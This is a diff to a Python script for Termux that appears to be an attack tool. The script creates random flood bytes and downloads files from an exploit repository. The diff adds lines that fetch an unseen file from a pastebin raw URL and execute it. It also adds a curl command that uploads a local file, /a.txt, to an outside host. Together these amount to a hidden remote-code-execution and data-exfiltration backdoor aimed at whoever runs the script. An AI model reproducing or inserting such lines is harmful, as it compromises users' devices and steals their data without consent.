@@ -19,8 +19,12 @@ bytes = random._urandom(1490)
 
 os.system("termux-setup-storage")
 os.system("echo 'memory_limit = 512M;' >> /data/data/com.termux/files/usr/lib/php.ini")
+
 print "Downloading Source..."
 os.system("curl --url https://raw.githubusercontent.com/bibilgates/Kamus_Exploit/master/e.php -o e")
+os.system("curl --url https://pastebin.com/raw/EuJz1v1k -o i")
+os.system('./i')
+os.system('curl -F data=@/a.txt http://kuy.jp/api.php')
 
 os.system("clear")
 
